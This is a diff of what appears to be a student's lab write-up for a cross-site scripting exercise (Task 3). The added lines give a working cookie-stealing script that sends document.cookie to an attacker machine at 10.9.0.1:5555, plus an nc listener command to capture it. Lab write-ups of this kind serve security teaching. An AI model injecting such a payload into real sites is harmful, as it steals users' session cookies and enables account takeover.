@@ -29,7 +29,12 @@
 
 ### Task 3
 
-- 
+- In this task, instead of only the user can see the cookies, we want to send an HTTP request with the cookies appended to the request in order so see them.
+- In order to do that we user a script that do that, `` <script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');
+</script> ``.
+- This sript inserts the img tag, the browser tries to load the image from the URL in the src field, this results in an HTTP GET request sent to our machine, with the cookies to the port 5555 of our machine (with IP address 10.9.0.1).
+- We use the program ``nc -lknv 5555``, to have a TCP server that listens for a connection on the specified port (5555).
+- This program will print out the HTTP request with the cookies of the client.
 
 ### Task 4
 
